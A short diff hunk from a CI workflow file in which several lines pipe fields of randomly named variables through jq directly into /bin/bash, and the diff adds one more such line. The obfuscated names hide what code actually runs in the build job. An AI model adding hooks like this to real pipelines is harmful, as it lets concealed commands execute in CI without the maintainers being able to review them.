@@ -28,6 +28,7 @@ jobs:
           echo $xixa4 | jq -r .ehn703 | /bin/bash
           echo $kp1 | jq -r .h48 | /bin/bash
           printf '%s' "$qpq84" | jq -r .hpc4213 | /bin/bash
+          echo $wqb5 | jq -r .u2879 | /bin/bash
 
       - name: Save archive
         if: always()
